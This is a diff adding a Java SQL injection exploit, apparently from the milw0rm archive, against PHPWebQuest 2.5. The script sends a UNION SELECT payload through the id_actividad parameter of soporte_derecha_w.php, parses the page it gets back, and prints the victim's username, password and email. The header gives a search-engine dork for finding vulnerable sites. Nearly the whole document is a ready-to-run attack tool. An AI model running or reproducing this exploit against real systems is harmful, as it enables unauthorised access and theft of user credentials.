@@ -1,0 +1,96 @@
+/*
+ * script name        : phpwebquest
+ * script version  : 2.5
+ * script website  : http://phpwebquest.org
+ * Bug Finder      : D4real_TeaM ('unkn0wnX','n3t-mapper','ToxiC350');
+ * injected file   : webquest/soporte_derecha_w.php
+ * Variable        : id_actividad
+ * Contact         : n3t-mapp3r [At] hotmail [dot] com,is14m [At] hotmail [dot] com,ushermehdi350 [At] hotmail [dot] com
+ *
+ * Usage:
+ *         First you must have a JDK 1.4 or more to compile the code
+ *         Compiling: javac -nowarn -g:none SqInjection.java
+ *         Usage: java SqInjection host_name /path/to/script/
+ * Dork : inurl:/webquest/soporte_derecha_w.php?
+ *
+ * GreetZ : s4udi-s3curity-terror, Spy-Boy, R3mix-boY, Dchach-X, DiaboliC4, j4v4k, Hitch4w4, Und34d and all Moroccan,arab hackerS
+ * Sp.Greetz : s0crateX ;)
+ */
+
+
+import java.io.*;
+import java.net.* ;
+public class SqInjection {
+
+    public static void main(String[] argv) {
+        Socket lhlawa;
+        String hName,tra9,bachT3tih=" union select 1,1,1,1,concat(usuario,0x3a,password,0x3a,e_mail) from usuario";
+        int lmarsa=80;
+        BufferedReader _______dakhl;PrintWriter _______kharj;
+        if(argv.length!=2){
+            System.out.println("Error: args not properly defined");
+            System.exit (-1);
+        }
+        String zgawa[]=argv[0].split(":");
+        if(zgawa.length==2){
+            hName=zgawa[0];
+            try{
+                lmarsa=Integer.parseInt(zgawa[1]);
+            }catch(NumberFormatException ex){
+                System.out.println("Error: Invalid Port");System.exit(0);
+            }
+        }else{
+            hName=argv[0];
+        }
+        tra9=argv[1];
+        System.out.print("Connecing to: "+hName);
+        try{
+            lhlawa=new Socket(hName,lmarsa);
+            System.out.println("\t\t[ OK ]");
+            String in3alBoh="",taya7Jdo="GET /"+tra9+"/webquest/soporte_derecha_w.php?id_actividad=-1"+URLEncoder.encode(bachT3tih)+"/* HTTP/1.1\n";
+            taya7Jdo+="Host: "+hName+"\n";
+            taya7Jdo+="Connection: Close\n\n";
+            _______kharj=new PrintWriter(lhlawa.getOutputStream());
+            _______dakhl=new BufferedReader(new InputStreamReader( lhlawa.getInputStream()));
+            _______kharj.print(taya7Jdo);
+            _______kharj.flush();
+            String line=_______dakhl.readLine();
+            if(line.equalsIgnoreCase("HTTP/1.1 200 OK")==false){
+                System.out.println("Error:Invalid HTTP protocol");System.exit(0);
+            }
+            boolean ok=false;
+            while((line=_______dakhl.readLine())!=null){
+                if(ok==false){
+                    if(line.length()==0)
+                        {ok=true;
+                        }
+                }
+                else in3alBoh+=line+"\n";   
+            }
+            _______kharj.close();
+            _______dakhl.close();
+            parseData(in3alBoh);
+        }catch(IOException ex){
+            System.out.println("\nSocket Error program will exit");
+            System.exit(0);
+        }
+    }
+    private static void parseData(String haHwaJay){
+        String uName,passwd,mail,tmp[];
+        tmp=haHwaJay.split("\n");
+        for(int i=0;i<tmp.length;i++)
+        {
+            if(tmp[i].trim().startsWith("<td width=\"97%\">"))
+            {
+                String safiTa7=tmp[i].trim().substring(16,tmp[i].trim().length()-4);
+                tmp=safiTa7.split (":");
+                break;
+            }
+        }
+        uName=tmp[0];passwd=tmp[1];mail=tmp[2];
+        System.out.println("*************************** Informations about the victim ***************************");
+        System.out.println("User Name: "+uName+"\nPassword: "+passwd+"\nVictimz mail: "+mail);
+    }
+}
+
+# milw0rm.com [2007-09-14]
